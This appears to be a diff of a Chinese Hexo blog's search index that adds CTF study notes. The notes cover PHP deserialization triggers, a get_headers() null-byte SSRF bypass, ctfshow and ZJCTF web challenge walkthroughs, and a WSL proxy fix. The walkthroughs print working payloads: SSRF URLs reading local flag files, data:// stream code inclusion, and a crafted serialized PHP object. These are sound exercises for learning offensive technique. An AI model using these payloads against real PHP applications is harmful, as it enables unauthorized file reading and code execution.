@@ -1,10 +1,49 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>Pickle</title>
+    <url>/2025/04/10/Pickle/</url>
+    <content><![CDATA[]]></content>
+  </entry>
+  <entry>
+    <title>PHP反序列化知识点</title>
+    <url>/2025/04/09/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9F%A5%E8%AF%86%E7%82%B9/</url>
+    <content><![CDATA[<p><a href="https://www.cnblogs.com/M0urn/articles/17761213.html">PHP反序列化 </a></p>
+<blockquote>
+<p><strong>其中的<code>__toString</code>触发的条件较多：</strong></p>
+<ol>
+<li>echo ( <code>$obj</code> ) &#x2F; print( <code>$obj</code> ) 打印时会触发</li>
+<li>反序列化对象与字符串连接时</li>
+<li>反序列化对象参与格式化字符串时</li>
+<li>反序列化对象与字符串进行=&#x3D;比较时（PHP进行=&#x3D;比较的时候会转换参数类型）</li>
+<li>反序列化对象参与格式化SQL语句，绑定参数时</li>
+<li>反序列化对象在经过php字符串函数，如 <code>strlen()</code>、<code>addslashes()</code>时</li>
+<li>在in_array()方法中，第一个参数是反序列化对象，第二个参数的数组中有 <code>toString</code> 返回的字符串的时候 <code>toString</code>会被调用</li>
+<li>反序列化的对象作为class_exists()的参数的时候</li>
+</ol>
+<p>&#x2F;&#x2F;来自威哥的反序列化笔记</p>
+</blockquote>
+<p><a href="https://www.yuque.com/boogipop/tdotcs/hobe2yqmb3kgy1l8?singleDoc#"><strong>愚人杯3rd [easy_php]</strong></a></p>
+<p>用内置类 ArrayObject，序列化出来的类型是 C，并且可以绕过 wakeup，可惜版本锁死 7.3。</p>
+<p>看不懂。</p>
+<p><a href="https://blog.csdn.net/weixin_51735061/article/details/123156046">CTF常用伪协议总结</a></p>
+<p><a href="https://hackerqwq.github.io/2021/08/29/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%B0%8F%E6%8A%80%E5%B7%A7%E4%B9%8BFast-Destruct/">PHP反序列化小技巧之Fast Destruct</a></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>人工智能基本概念</title>
+    <url>/2025/04/08/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/</url>
+    <content><![CDATA[]]></content>
+  </entry>
+  <entry>
     <title>[GKCTF 2020]cve版签到</title>
     <url>/2025/04/07/GKCTF-2020-cve%E7%89%88%E7%AD%BE%E5%88%B0/</url>
     <content><![CDATA[<p>cve-2020-7066</p>
-<p>PHP 7.2.29之前的7.2.x版本、 7.3.16之前的7.3.x版本、 7.4.4之前的7.4.x版本中的 ‘get_headers()’函数存在安全漏洞。可以 ⽤来绕WAF，SSRF利⽤。</p>
+<p>PHP 7.2.29 之前的 7.2.x 版本、 7.3.16之前的 7.3.x 版本、 7.4.4 之前的 7.4.x 版本中的 ‘get_headers()’函数存在安全漏洞。可以用来绕WAF，SSRF利用。</p>
+<p>0x00 是十六进制表示方法，是在 ascii 码中为 0 的字符，有些函数会将 0x00 当做结束符，从而进行文件上传的绕过。</p>
+<p> 在 url 里面，get 传⼊的 %00 会经过⼀次解码，解码为 0x00,发挥截断作用。</p>
+<p><code> ?url=http://127.0.0.1%00ctfhub.com</code></p>
+<p><code>?url=http://127.0.0.123%00.ctfhub.com</code></p>
 ]]></content>
       <categories>
         <category>Web</category>
@@ -18,7 +57,35 @@
   <entry>
     <title>由wsl连不上代理引发的一系列事件</title>
     <url>/2025/04/07/%E7%94%B1wsl%E8%BF%9E%E4%B8%8D%E4%B8%8A%E4%BB%A3%E7%90%86%E5%BC%95%E5%8F%91%E7%9A%84%E4%B8%80%E7%B3%BB%E5%88%97%E4%BA%8B%E4%BB%B6/</url>
-    <content><![CDATA[]]></content>
+    <content><![CDATA[<blockquote>
+<p>本文是本人对于使用代理过程中的一些经验总结，并不是教程或者技术性文章，所以内容比较不全面很正常（<br>本文不会提供任何软件的下载链接，如有需求请自行查找相关下载源。</p>
+</blockquote>
+<p>一个平平无奇的下午，我的wsl报错了：</p>
+<img src="/2025/04/07/%E7%94%B1wsl%E8%BF%9E%E4%B8%8D%E4%B8%8A%E4%BB%A3%E7%90%86%E5%BC%95%E5%8F%91%E7%9A%84%E4%B8%80%E7%B3%BB%E5%88%97%E4%BA%8B%E4%BB%B6/350A7EF3E16F13BCFDDBA472EFB9A05E.png" class="" title="350A7EF3E16F13BCFDDBA472EFB9A05E">
+
+<p>审视了一下我的 Clash，有系统代理和虚拟网卡模式，那么这两个之间的区别是什么？</p>
+<p>请看<a href="https://blog.revincx.icu/posts/proxy-summary/index.html">关于『代理』的不完全使用指北</a></p>
+<p>省流版：</p>
+<p>当你打开系统代理时，代理软件就会修改系统设置中的代理选项。但是，系统设置中的代理往往只可设置为HTTP代理，而且这个HTTP代理只对当前系统上web浏览器有效。**这也就是为什么明明设置了系统代理，访问GitHub也很快，但在命令行里克隆一个GitHub的仓库却很慢的原因。**在命令行下，执行git命令也就是直接执行git的二进制文件，跟你设置的系统代理是没有关系的。</p>
+<p>而 Tun 模式：</p>
+<blockquote>
+<p>工作原理<br>Tun 模式通过在操作系统中创建一个虚拟网络接口（即虚拟网卡），实现对所有出站网络流量的捕获和重定向。这是通过修改系统的路由表完成的，将所有或特定目标的IP流量都重定向到虚拟网卡。接着，代理程序从这张虚拟网卡读取流量，处理后再发送到原本的目标地址或其他指定的代理服务器。</p>
+<p>此模式的关键在于，它在操作系统层面拦截网络流量，不依赖于应用程序的代理支持，因此可以处理从 TCP 到UDP 的所有类型的流量。</p>
+</blockquote>
+<p>最终解决方案：</p>
+<p>开虚拟网卡模式，关闭系统代理，开局域网连接 wsl 开镜像模式，正常网页和外网和 wsl 代理都搞好了。</p>
+<p>待解决的问题：</p>
+<p>解释理网卡、网卡接口、内核、IP等属性的关系。</p>
+<p>解释Linux虚拟网卡设备tun&#x2F;tap的一切。<a href="https://junmajinlong.com/virtual/network/kernel_nic_ip/">https://junmajinlong.com/virtual/network/kernel_nic_ip/</a></p>
+<p><a href="https://blog.skk.moe/post/what-happend-to-dns-in-proxy/">浅谈在代理环境中的 DNS 解析行为</a></p>
+]]></content>
+      <categories>
+        <category>计网</category>
+      </categories>
+      <tags>
+        <tag>wsl</tag>
+        <tag>代理</tag>
+      </tags>
   </entry>
   <entry>
     <title>SSRF例会作业</title>
@@ -513,7 +580,19 @@
     <url>/2025/03/26/CTFSHOW%E5%88%B7%E9%A2%98%E6%B1%87%E6%80%BB/</url>
     <content><![CDATA[<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h1 id="PWN-入门"><a href="#PWN-入门" class="headerlink" title="PWN 入门"></a>PWN 入门</h1><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h1 id="WEB-入门"><a href="#WEB-入门" class="headerlink" title="WEB 入门"></a>WEB 入门</h1><span id="more"></span>
 
-<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><h3 id="web1-23"><a href="#web1-23" class="headerlink" title="web1-23"></a>web1-23</h3><h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><h3 id="web78-83"><a href="#web78-83" class="headerlink" title="web78-83"></a>web78-83</h3><h3 id="web87-88"><a href="#web87-88" class="headerlink" title="web87-88"></a>web87-88</h3><h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><h3 id="web351"><a href="#web351" class="headerlink" title="web351"></a>web351</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$url=$_POST [&#x27;url&#x27;];</span><br><span class="line">$ch=curl_init($ url);</span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, 0);</span><br><span class="line">curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);</span><br><span class="line">$result=curl_exec($ ch);</span><br><span class="line">curl_close($ch);</span><br><span class="line">echo ($result);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><h3 id="web1-23"><a href="#web1-23" class="headerlink" title="web1-23"></a>web1-23</h3><h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><h3 id="web78-83"><a href="#web78-83" class="headerlink" title="web78-83"></a>web78-83</h3><h3 id="web87-88"><a href="#web87-88" class="headerlink" title="web87-88"></a>web87-88</h3><h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><h3 id="web254"><a href="#web254" class="headerlink" title="web254"></a>web254</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkVip</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>)&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;isVip=<span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">vipOneKeyGetFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;isVip)&#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;your flag is &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;no vip, no flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$user</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfShowUser</span>();</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">checkVip</span>())&#123;</span><br><span class="line">            <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">vipOneKeyGetFlag</span>();</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
+
+<h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><h3 id="web351"><a href="#web351" class="headerlink" title="web351"></a>web351</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$url=$_POST [&#x27;url&#x27;];</span><br><span class="line">$ch=curl_init($ url);</span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, 0);</span><br><span class="line">curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);</span><br><span class="line">$result=curl_exec($ ch);</span><br><span class="line">curl_close($ch);</span><br><span class="line">echo ($result);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 
 <p>url &#x3D; <a href="http://127.0.0.1/flag.php">http://127.0.0.1/flag.php</a><br>url &#x3D; localhost&#x2F;flag.php<br>url &#x3D; 127.0.0.1&#x2F;flag.php</p>
 <p>url &#x3D; file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php(在源代码)</p>
@@ -2855,7 +2934,21 @@ X-Forwarded-For: &#123;phpinfo()&#125;
   <entry>
     <title>[ZJCTF 2019]NiZhuanSiWei</title>
     <url>/2025/02/13/ZJCTF-2019-NiZhuanSiWei/</url>
-    <content><![CDATA[]]></content>
+    <content><![CDATA[<p>4.9 本人今天才正式明白反序列化在干嘛。</p>
+<h1 id="file-get-contents-与-data-协议"><a href="#file-get-contents-与-data-协议" class="headerlink" title="file_get_contents 与 data:&#x2F;&#x2F;协议"></a>file_get_contents 与 data:&#x2F;&#x2F;协议</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$text</span> = <span class="variable">$_GET</span>[<span class="string">&quot;text&quot;</span>];</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_GET</span>[<span class="string">&quot;password&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$text</span>)&amp;&amp;(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;welcome to the zjctf&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Not now!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>(); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$file</span>);  <span class="comment">//useless.php</span></span><br><span class="line">        <span class="variable">$password</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$password</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>data:&#x2F;&#x2F;协议 需要allow_url_fopen,allow_url_include均为on 这是一个输入流执行的协议，它可以向服务器输入数据，而服务器也会执行。常用代码如下：<code> http://127.0.0.1/include.php?file=data://text/plain,&lt;?php%20phpinfo();?&gt; text/plain</code>，表示的是文本 text&#x2F;plain;base64, 若纯文本没用可用base64编码 </p>
+</blockquote>
+<p><code>if(isset($text)&amp;&amp;(file_get_contents($text,&#39;r&#39;)===&quot;welcome to the zjctf&quot;))&#123; 这是检查text是不是=welcome to the zjctf</code></p>
+<p>我会写出<br>text&#x3D;welcome to the zjctf（这样的话“他会去打开”welcome to xxx”这个文件去读取”）<br>这种东西</p>
+<p>file get content 函数，读取文件里的内容</p>
+<p>data 协议就像是打开了一个文件，后面的数据就是文件里的数据</p>
+<p><code>userless.php</code>里没有反序列化函数，要借别人的。刚好 index.php 里有，还有 include。所以让 file&#x3D;userless.php，然后输入以下脚本输出的内容</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">   </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$flagObj</span> = <span class="keyword">new</span> <span class="title class_">Flag</span>();</span><br><span class="line"><span class="variable">$flagObj</span>-&gt;file = <span class="string">&#x27;flag.php&#x27;</span>; <span class="comment">// 假设 test.txt 是一个存在的文件</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$flagObj</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>text=data://text/plain,welcome to the zjctf&amp;file=useless.php&amp;password=O%3A4%3A%22Flag%22%3A1%3A%7Bs%3A4%3A%22file%22%3Bs%3A8%3A%22flag.php%22%3B%7D</code></p>
+]]></content>
       <categories>
         <category>Web</category>
       </categories>
